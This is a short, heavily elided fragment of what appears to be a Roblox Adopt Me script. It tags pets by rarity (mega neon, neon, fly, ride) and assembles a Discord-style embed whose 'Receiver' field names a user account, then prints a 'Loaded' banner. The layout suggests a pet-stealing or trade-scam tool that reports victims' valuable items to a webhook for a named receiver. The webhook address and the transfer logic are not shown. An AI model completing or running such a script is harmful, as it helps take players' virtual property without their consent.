...
local function getEmoji(p)
    if p.mega_neon then return "𝖒𝖊𝖌𝖆" end
    if p.neon then return "𝖓𝖊𝖔𝖓" end
    if p.flyable and p.rideable then return "𝓕𝓡" end
    if p.flyable then return "𝓕𝓛𝓨" end
    if p.rideable then return "𝓡𝓘𝓓𝓔" end
    return "🐶"
end
...
local payload = {
    ...
    embeds = {{
        ...
        fields = {
            ...
            {name = "<:emoji_3:1402578008245801086> **Receiver**", value = "```ieaaaaa0```", inline = true},
...
print("[ScriptS.Sm] Adopt Me Loaded..")
